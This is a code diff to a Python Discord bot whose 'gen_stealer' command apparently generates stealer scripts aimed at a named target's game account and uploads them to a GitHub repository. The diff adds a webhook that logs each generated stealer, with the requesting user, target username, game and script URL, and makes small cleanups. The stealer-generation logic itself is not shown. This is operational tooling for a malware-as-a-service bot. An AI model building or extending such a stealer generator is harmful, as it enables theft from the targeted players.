@@ -12,6 +12,7 @@ import threading
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
 GITHUB_REPO = "SharScript/Scripts"
+LOGS_WEBHOOK_URL = os.getenv('LOGS_WEBHOOK_URL')
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -132,6 +133,26 @@ async def gen_stealer(
 
             await interaction.user.send(embed=embed, view=view)
             await interaction.followup.send(f"Check your DMs, {interaction.user.mention}!", ephemeral=True)
+
+            # Logging webhook
+            if LOGS_WEBHOOK_URL:
+                log_data = {
+                    "embeds": [{
+                        "title": "New Stealer Generated",
+                        "color": 0xFF0000,
+                        "fields": [
+                            {"name": "Discord User", "value": f"{interaction.user} (`{interaction.user.id}`)", "inline": False},
+                            {"name": "Target Username", "value": username, "inline": True},
+                            {"name": "Game", "value": game_type.name, "inline": True},
+                            {"name": "Script URL", "value": raw_url, "inline": False}
+                        ],
+                        "footer": {"text": "Logger by Pethical"}
+                    }]
+                }
+                try:
+                    requests.post(LOGS_WEBHOOK_URL, json=log_data)
+                except Exception as e:
+                    print(f"Failed to send log webhook: {e}")
         else:
             await interaction.followup.send("Failed to upload script. Try again.", ephemeral=True)
 
@@ -140,7 +161,7 @@ async def gen_stealer(
         await interaction.followup.send("An error occurred. Please try again.", ephemeral=True)
     finally:
         if os.path.exists(filename):
-            os.remove(filename)            
+            os.remove(filename)
 
 @bot.event
 async def on_ready():
@@ -152,10 +173,8 @@ if not BOT_TOKEN:
     print("Error: BOT_TOKEN not found in environment variables")
     exit(1)
 
-# Run Flask on port 5000 to allow external access
 def run_flask():
     app.run(host='0.0.0.0', port=5000)
 
 threading.Thread(target=run_flask).start()
-
 bot.run(BOT_TOKEN)
